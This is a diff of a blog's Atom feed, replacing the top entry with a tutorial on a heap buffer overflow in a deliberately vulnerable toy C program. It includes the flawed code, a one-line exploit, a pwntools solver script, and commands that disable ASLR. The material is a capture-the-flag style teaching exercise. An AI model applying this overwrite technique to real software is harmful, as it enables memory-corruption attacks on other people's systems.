@@ -1,4 +1,214 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-15T10:33:54-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Return Oriented Programming Tutorial</title><link href="http://localhost:4000/2020/10/14/return-oriented-programming-tutorial.html" rel="alternate" type="text/html" title="Return Oriented Programming Tutorial" /><published>2020-10-14T00:00:00-04:00</published><updated>2020-10-14T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/14/return-oriented-programming-tutorial</id><content type="html" xml:base="http://localhost:4000/2020/10/14/return-oriented-programming-tutorial.html">&lt;p&gt;In this blog post, I will be explaining how you can make use of Return Oriented Programming (ROP) gadgets in order to execute code when NX is enabled. I will also be solving one of ROP Emporium’s challenges by using a ROP chain.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-10-21T22:29:36-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Simple Heap Buffer Overflow</title><link href="http://localhost:4000/2020/10/21/simple-heap-buffer-overflow.html" rel="alternate" type="text/html" title="Simple Heap Buffer Overflow" /><published>2020-10-21T00:00:00-04:00</published><updated>2020-10-21T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/21/simple-heap-buffer-overflow</id><content type="html" xml:base="http://localhost:4000/2020/10/21/simple-heap-buffer-overflow.html">&lt;p&gt;Earlier today, I was messing around with some code, and I came up with &lt;a href=&quot;../../../assets/other/2020-10-21-heap-buffer-overflow/people.c&quot;&gt;this vulnerable program&lt;/a&gt;. This program was written using bad programming habits on purpose, and I am going to show you how it is vulnerable to a buffer overflow. This isn’t a complicated vulnerability, and while it does involve corrupting memory on the heap, it does not require you to have in-depth knowledge about how the heap works (unlike many other heap exploits).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;0 | &lt;span class=&quot;nb&quot;&gt;sudo tee&lt;/span&gt; /proc/sys/kernel/randomize_va_space
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;First of all, I am going to disable ASLR on my computer using the above command. This will make explaining the vulnerability a little bit easier, but later, I will show you a Python script that works even if ASLR is enabled.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./people
+win() is at 0x55555555529f.
+
+Valid commands:
+new: Give birth to a new person.
+greet: Say hello to a person.
+kill: Kill a person.
+quit: Stop the program.
+
+&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When you first run the program, you’ll see that it leaks the location of a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;. Our goal is to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;, which prints out the flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag{insert_flag_here}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The program allows the user to type in various commands, so let’s see what happens when we issue the “new” command while running the program.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; new
+Enter the person's name: Nihaal
+Nihaal was born at 0x555555559ac0.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The new command allows the user to create a new &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; on the heap, and it will print out the heap address where it was created. In this case, the program stored information about our &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; at address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x555555559ac0&lt;/code&gt;. Looking at the code, we can see that this is implemented using a structure called &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_Person&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_Person&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Something that is interesting is that this structure also contains a function pointer called &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt;. If we look a little bit further down in the code, we can see that there are two more functions, each of which contain some kind of greeting.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s says hello.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;yo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s says yo.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s go back to the running program again and use the &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command to see what happens.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; greet
+Type in the address of the person you want to say hi to: 0x555555559ac0
+You say hello to Nihaal.
+Nihaal says yo.
+&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Interesting. What happens if we create another user and do the same thing?&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; new
+Enter the person's name: Sam
+Sam was born at 0x555555559af0.
+&amp;gt; greet
+Type in the address of the person you want to say hi to: 0x555555559af0
+You say hello to Sam.
+Sam says hello.
+&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Notice how in the first instance, we were greated with “yo,” but in the second instance, we were greated with “hello.” What is happening here is that in the first &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; instance, we had set the function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;yo&lt;/code&gt;, and it had executed the &lt;code class=&quot;highlighter-rouge&quot;&gt;yo()&lt;/code&gt; function. In the second &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; instance, we had set the function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt;, and it executed the &lt;code class=&quot;highlighter-rouge&quot;&gt;hello()&lt;/code&gt; function instead.&lt;/p&gt;
+
+&lt;p&gt;This is essentially how object-oriented programming and polymorphism can be emulated in C. While C is obviously not an object-oriented language, you can still incorporate object-oriented behavior in C code by maintaining pointers to functions in structures. When you want to change the behavior of an object, all you have to do is change the function pointer in its structure for that instance of the object.&lt;/p&gt;
+
+&lt;p&gt;Let’s take a look at the code responsible for dealing with the &lt;code class=&quot;highlighter-rouge&quot;&gt;new&lt;/code&gt; command, which is located in &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt;. I’ve added some comments to the code to explain what’s going on.&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;new&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Buf contains the user input, and it can have a maximum of BUF_SIZE characters.&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Person&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// p is a Person* variable&lt;/span&gt;
+                                &lt;span class=&quot;c1&quot;&gt;// Whoops, I forget to check for malloc() returning NULL. Oh well.&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;greeting_flip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set the greeting to be either hello() or yo()&lt;/span&gt;
+                                              &lt;span class=&quot;c1&quot;&gt;// Note that greeting_flip is initialized to 0, so &quot;yo&quot; will always be the first greeting&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;greeting_flip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;greeting_flip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Use the other greeting next time&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the person&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s name: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BUF_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Get user input&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sscanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Copy the person's name to the name buffer in p&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s was born at %p.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Print out the location where p is stored on the heap&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt; variable is a type of &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; that was just allocated memory using &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting_flip&lt;/code&gt; variable is initially set to 0, which means that &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; will always be first set to &lt;code class=&quot;highlighter-rouge&quot;&gt;yo&lt;/code&gt;. It will then flip back and forth between using &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt; and using &lt;code class=&quot;highlighter-rouge&quot;&gt;yo&lt;/code&gt; as the greeting function whenever you create a new &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now lets take a look at the code responsible for dealing with the &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command, which is also located in &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;else if(strncmp(buf, &quot;greet&quot;, 5) == 0) { // Check if user input is &quot;greet&quot;
+    printf(&quot;Type in the address of the person you want to say hi to: &quot;);
+    fgets(buf, BUF_SIZE, stdin); // Scan the address into buf
+    sscanf(buf, &quot;%p&quot;, &amp;amp;p); // Convert the address into a Person* pointer
+    printf(&quot;You say hello to %s.\n&quot;, p-&amp;gt;name);
+    p-&amp;gt;greeting(p); // Execute the greeting function
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once you use the &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command, notice how the program executes whatever function &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; is equal to. What if there was a way for us to control the function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt;? If we were able to set &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; equal to the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;, then we could execute &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; when we greet a person. This would print out the flag and solve the problem!&lt;/p&gt;
+
+&lt;p&gt;Note that in both code segments, the call to &lt;code class=&quot;highlighter-rouge&quot;&gt;fgets()&lt;/code&gt; uses &lt;code class=&quot;highlighter-rouge&quot;&gt;BUF_SIZE&lt;/code&gt; as the size of the buffer. From the programmer’s perspective, this makes sense because &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; is an array on the stack with length &lt;code class=&quot;highlighter-rouge&quot;&gt;BUF_SIZE&lt;/code&gt;. Scroll to the top of the C file to see what &lt;code class=&quot;highlighter-rouge&quot;&gt;BUF_SIZE&lt;/code&gt; is.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define BUF_SIZE 128
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Wait, hold on a second. Wasn’t the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer in &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; only 32 bytes long? We were copying whatever string was inside the buffer to &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt;, so can we overflow the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer? Are we able to overwrite the value of the &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; pointer that comes directly after &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt;? To answer these questions, let’s see what happens when we give the program a large input value.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./people
+win() is at 0x55555555529f.
+
+Valid commands:
+new: Give birth to a new person.
+greet: Say hello to a person.
+kill: Kill a person.
+quit: Stop the program.
+
+&amp;gt; new
+Enter the person's name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA was born at 0x555555559ac0.
+&amp;gt; greet
+Type in the address of the person you want to say hi to: 0x555555559ac0
+You say hello to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The program gave us a segmentation fault after we tried to greet that person. This means that we most likely overwrote the &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; parameter, and if we’re able to control the &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; parameter, we can execute whatever function we want to! Since the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; attribute is 32 characters long, we could probably just write the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; right after it. Then we could use the &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command to execute our code.&lt;/p&gt;
+
+&lt;p&gt;Since ASLR is currently disabled, we know that the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; will always be &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55555555529f&lt;/code&gt;, which is written as &lt;code class=&quot;highlighter-rouge&quot;&gt;b'\x9fRUUUU'&lt;/code&gt; as a Python little-endian byte string. Also, because ASLR is disabled, we also know that the first address that &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; will return will always be &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55555555a6c0&lt;/code&gt;. This address does not have to be inputted in little endian format because the &lt;code class=&quot;highlighter-rouge&quot;&gt;%p&lt;/code&gt; string formatter automatically converts it to little-endian format.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c &quot;import sys; sys.stdout.buffer.write(b'new\n' + b'A'*32 + b'\x9fRUUUU' + b'\ngreet\n' + b'0x55555555a6c0\n' + b'q\n')&quot; | ./people
+win() is at 0x55555555529f.
+
+Valid commands:
+new: Give birth to a new person.
+greet: Say hello to a person.
+kill: Kill a person.
+quit: Stop the program.
+
+&amp;gt; Enter the person's name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�RUUUU was born at 0x55555555a6c0.
+&amp;gt; Type in the address of the person you want to say hi to: You say hello to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�RUUUU.
+flag{insert_flag_here}
+&amp;gt; Ending program.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;My exploit above will first issue the “new” command to create a new &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt;. Then it will overflow the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer on the heap so that we are able to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; with the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;. From there, we issue a &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command. The &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command requires the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; as input, and since we know that &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; will always first return &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55555555a6c0&lt;/code&gt;, we can just supply that as the &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt;’s address. This will execute the function that &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; points to, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; in this case. From there, we can issue the &lt;code class=&quot;highlighter-rouge&quot;&gt;q&lt;/code&gt; command to exit the program.&lt;/p&gt;
+
+&lt;p&gt;This exploit uses hardcoded addresses, but since the program leaks the addresses of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; and each &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; that we create, it is simple to write a script that exploits this program even when ASLR is enabled.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from pwn import *
+
+# Start the process and get the flag
+p = process(&quot;./people&quot;)
+win_addr = p64(int(str(p.recv()).split(&quot;\\n&quot;)[0].split(&quot; &quot;)[3][:-1], 16))
+
+# Create a new person, set his/her greeting to win_addr, and get their address
+p.sendline(b&quot;new&quot;)
+p.sendline(b&quot;A&quot;*32 + win_addr)
+person_addr = p64(int(str(p.recv()).split(&quot;\\n&quot;)[0].split()[9][:-1], 16))
+
+# Execute the win() function and get the flag
+p.sendline(b&quot;greet&quot;)
+p.sendline(person_addr)
+print(str(p.recv()).split(&quot;\\n&quot;)[1])
+
+# End the program
+p.sendline(b&quot;kill&quot;)
+p.sendline(person_addr)
+p.sendline(b&quot;q&quot;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And this is what happens when we run the script with ASLR turned on.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+2
+$ python solver.py
+[+] Starting local process './people': pid 40221
+flag{insert_flag_here}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;section class=&quot;related&quot;&gt;
